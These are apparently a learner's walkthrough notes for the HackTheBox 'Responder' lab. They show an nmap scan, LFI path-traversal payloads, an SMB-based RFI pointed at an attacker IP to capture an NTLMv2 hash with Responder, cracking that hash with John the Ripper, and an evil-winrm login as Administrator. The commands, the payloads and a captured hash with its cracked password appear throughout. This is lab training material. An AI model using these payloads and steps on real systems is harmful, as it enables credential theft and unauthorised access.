[[Responder.pdf]]
*Tech used*
~nmap
~Responder
~John the ripper

*vulnerability*
Local File Inclusion


*Process*

~nmap scan 
```
nmap -sC -sV -p- --min-rate 1000 {ip}

#Response

PORT Â  Â  STATE SERVICE Â  Â VERSION  
80/tcp Â  open Â http Â  Â  Â  Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) 
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1  
5985/tcp open Â http Â  Â  Â  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
7680/tcp open Â tcpwrapped  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

~navigate to ip in browser ðŸŒ
Browser tries to redirect but cannot find the unika.htb address in the redirect.
Name based virtual hosting assumed.

~add entry to /etc/hosts file
```
echo "{ip} unika.htb" | sudo tee -a /etc/hosts
```

~using wappalyzer we see this is php

~seeing language change option, we use it and we see that the site uses the page parameter, which can be vulnerable to local file inclusion
```
http://unika.htb/index.php?page=french.html
```

~testing for lfi with âŒ¨ðŸ–¥ï¸
```
http://unika.htb/index.php?page=../../../../../../../../
```
returns
```

**Warning**: include(C:\): Failed to open stream: No such file or directory in **C:\xampp\htdocs\index.php** on line **11**  
  
  
  
**Warning**: include(): Failed opening '../../../../../../../../../../../../' for inclusion (include_path='\xampp\php\PEAR') in **C:\xampp\htdocs\index.php** on line **11**
```
so now we know its vulnerableâœ”ï¸

~now we can try reading the host file with  ðŸ¤”
```
http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
```
thats it ðŸ˜€
```
# Copyright (c) 1993-2009 Microsoft Corp.  
#  
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.  
#  
# This file contains the mappings of IP addresses to host names. Each  
# entry should be kept on an individual line. The IP address should  
# be placed in the first column followed by the corresponding host name.  
# The IP address and the host name should be separated by at least one  
# space.  
#  
# Additionally, comments (such as these) may be inserted on individual  
# lines or following the machine name denoted by a '#' symbol.  
#  
# For example:  
#  
# 102.54.94.97 [rhino.acme.com](http://rhino.acme.com) # source server  
# 38.25.63.10 [x.acme.com](http://x.acme.com) # x client host  
  
# localhost name resolution is handled within DNS itself.  
# Â  Â 127.0.0.1 localhost  
# Â  Â ::1 localhost
```

~info on include at https://www.php.net/manual/en/function.include.php

~ device is on windows and vulnerable to lfi, lets try to exploit smb to get the NetNTLMv2 with rfi

~lets boot responder on our vpn interface with
```
responder -I tun0
```

" *In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash.* "

~Ok now responder is listening lets try to connect with rfi. We can use the URL like this, making sure were using our attacking IP
```
http://unika.htb/?page=//{attacking_IP}/somefile 
```

~we got the hash
```
[SMB] NTLMv2-SSP Client Â  : 10.129.185.125  
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator  
[SMB] NTLMv2-SSP Hash Â  Â  : Administrator::RESPONDER:c72a3944f52a980a:3D1D8E597E5E28FECAE5B05B266BA321:01010000000000008088CB8C6AF4D9016A2CE5AC8A99E2E000000000020008004C004E003000460001001E00570049004E002D0035003800560037005500380038003300480035004F0004003400570049004E002D0035003800560037005500380038003300480035004F002E004C004E00300046002E004C004F00430041004C00030014004C004E00300046002E004C004F00430041004C00050014004C004E00300046002E004C004F00430041004C00070008008088CB8C6AF4D90106000400020000000800300030000000000000000100000000200000CA84AD28B694B3081293A77F2BB811AA6AA1A0D1B6693BC8553AFDA47823FD650A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00330033000000000000000000
```

~now lets save it and feed it to jtr
```
echo Administrator::RESPONDER:c72a3944f52a980a:3D1D8E597E5E28FECAE5B05B266BA321:01010000000000008088CB8C6AF4D9016A2CE5AC8A99E2E000000000020008004C004E003000460001001E00570049004E002D0035003800560037005500380038003300480035004F0004003400570049004E002D0035003800560037005500380038003300480035004F002E004C004E00300046002E004C004F00430041004C00030014004C004E00300046002E004C004F00430041004C00050014004C004E00300046002E004C004F00430041004C00070008008088CB8C6AF4D90106000400020000000800300030000000000000000100000000200000CA84AD28B694B3081293A77F2BB811AA6AA1A0D1B6693BC8553AFDA47823FD650A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00330033000000000000000000 > hashResponder.txt
```

```
john -w=/usr/share/wordlists/rockyou.txt hashResponder.txt
```

~ðŸ’¥the password is
```
badminton
```

~remember our scan? WinRM was running on port 5985, lets try the  NetNTLMv password we just cracked
```
evil-winrm -i {IP} -u administrator -p badminton
```

~from her we navigate up the file tree, look for the user profile and search through till we find the flag!! 
good job